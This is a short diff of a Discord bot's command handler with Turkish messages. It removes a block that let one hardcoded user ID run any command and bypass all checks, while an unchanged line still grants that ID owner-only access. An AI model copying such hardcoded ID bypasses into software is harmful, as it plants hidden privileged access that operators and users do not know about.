@@ -199,12 +199,12 @@ module.exports = class {
             cmd = client.commands.get(client.aliases.get(command));
         } else return;
         const embed = new Discord.MessageEmbed();
-        if(message.author.id == "853011311328100411"){
+       
 
-            cmd.run(client, message, args);
 
-        }
-        else
+
+        
+
         if (!cmd.config.enabled) return;
         if (cmd.config.dmCmd && (message.channel.type !== 'dm')) return message.channel.send(`${emojis.get("dmcmd").value()} Bu komut bir **DM** komutudur.`);
         if (cmd.config.ownerOnly && (message.author.id !== client.config.owner)&& (message.author.id !== "853011311328100411")) return message.channel.send(`${emojis.get("tantus").value()} Bu komutu sadece ${client.owner} kullanabilir.`);
